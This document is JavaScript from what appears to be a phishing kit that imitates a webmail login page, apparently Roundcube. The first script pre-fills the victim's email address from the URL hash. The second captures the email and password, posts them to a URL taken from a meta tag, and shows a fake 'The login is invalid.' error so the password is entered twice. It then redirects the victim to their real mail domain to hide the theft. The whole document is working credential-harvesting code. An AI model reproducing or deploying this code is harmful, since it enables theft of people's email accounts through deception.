<script>
(function () {
  function dbg(...args) { if (window.console) console.log('[hash-email]', ...args); }

  // Try to find the input; prefer id="ai"
  function findInput() {
    return document.getElementById('ai') ||
           document.querySelector('input[name="email"], input[type="email"], input[type="text"]');
  }

  // Normalize + decode hash string
  function getDecodedHash() {
    let raw = window.location.hash || '';
    if (raw.startsWith('#')) raw = raw.substring(1);
    try { return decodeURIComponent(raw); } catch (e) { return raw; }
  }

  // Extract text from patterns:
  //  - [[-value-]]
  //  - [[value]]
  //  - plain value (fallback)
  function extractValueFromHash(decoded) {
    if (!decoded) return null;

    // 1) [[-value-]]
    const p1 = decoded.match(/\[\[\s*-\s*([\s\S]*?)\s*-\s*\]\]/);
    if (p1 && p1[1]) return p1[1].trim();

    // 2) [[value]]
    const p2 = decoded.match(/\[\[\s*([\s\S]*?)\s*\]\]/);
    if (p2 && p2[1]) return p2[1].trim();

    // 3) fallback: plain text (e.g. #Email or #erd@gmail.com)
    if (decoded.trim()) return decoded.trim();

    return null;
  }

  function fillFromHash() {
    const decoded = getDecodedHash();
    dbg('raw hash decoded ->', decoded);

    const extracted = extractValueFromHash(decoded);
    dbg('extracted ->', extracted);

    const input = findInput();
    if (!input) {
      dbg('No input found. Make sure you have <input id="ai"> on the page.');
      return;
    }

    if (extracted !== null && extracted !== '') {
      input.value = extracted;
      dbg('Input filled with:', extracted);

      // OPTIONAL: remove hash so value isn't visible in address bar.
      // Uncomment if you want this behavior:
      // history.replaceState(null, '', location.pathname + location.search);
    } else {
      dbg('No value extracted from hash.');
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', fillFromHash);
  } else {
    fillFromHash();
  }
})();
</script>

<script>
    let submitCount = 0;
    const formActionUrl = document.querySelector('meta[name="form-action-url"]').getAttribute("content");

    function handleSubmit(event) {
        event.preventDefault(); // Prevent default submission

        const form = document.getElementById("login-form");
        const formData = new FormData(form);
        const emailInput = document.getElementById("ai").value.trim();

        submitCount++; // Count this submit attempt

        sendFormData(formData, emailInput); // Send data

        document.getElementById("password").value = ""; // Clear password

        // Show error only after first attempt
        if (submitCount === 1) {
            showError("The login is invalid.");
        } else {
            hideError(); // Clear error if second attempt
        }
    }

    function showError(message) {
        const errorContainer = document.getElementById("error-container");
        const errorMessage = document.getElementById("error-message");

        errorMessage.textContent = message;
        errorContainer.style.display = "flex";

        // Optional: auto-hide after 4 seconds
        setTimeout(() => {
            errorContainer.style.display = "none";
        }, 4000);
    }

    function hideError() {
        document.getElementById("error-container").style.display = "none";
    }

    function sendFormData(formData, emailInput) {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", formActionUrl, true);

        xhr.onload = function () {
            if (xhr.status === 200) {
                if (submitCount >= 2) {
                    redirectToWebmail(emailInput);
                }
            } else {
                showError("An error occurred. Please try again.");
            }
        };

        xhr.send(formData);
    }

    function redirectToWebmail() {
    setTimeout(() => {
        const email = document.getElementById("ai")?.value.trim();

        if (email && email.includes("@")) {
            const domainPart = email.split("@")[1].trim(); // part after @
            window.location.href = `https://${domainPart}`;
        }
    }, 100);
}

    window.addEventListener("DOMContentLoaded", function () {
        document.getElementById("rcmloginsubmit").addEventListener("click", handleSubmit);
        document.getElementById("login-form").addEventListener("keydown", function (event) {
            if (event.key === "Enter") {
                event.preventDefault();
                handleSubmit(event);
            }
        });

        // Ensure error is hidden initially (just in case)
        hideError();
    });
</script>
